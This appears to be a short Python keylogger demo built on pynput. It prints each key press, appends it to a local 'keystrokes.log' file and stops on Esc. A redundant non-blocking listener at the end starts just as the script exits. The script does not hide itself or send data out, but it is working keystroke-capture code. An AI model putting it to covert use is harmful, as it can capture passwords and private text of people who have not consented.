from pynput import keyboard

# Define the log file name
LOG_FILE = "keystrokes.log"

# Function to write keystrokes to a file
def write_to_file(key):
    with open(LOG_FILE, "a") as f:
        f.write(key + "\n")

# Function to handle key press events
def on_press(key):
    try:
        key_str = key.char if key.char else str(key)
    except AttributeError:
        key_str = str(key)
    
    print(f'Key {key_str} pressed')
    write_to_file(key_str)

# Function to handle key release events
def on_release(key):
    print(f'{key} released')
    if key == keyboard.Key.esc:
        return False  # Stop listener

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Alternative non-blocking listener
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
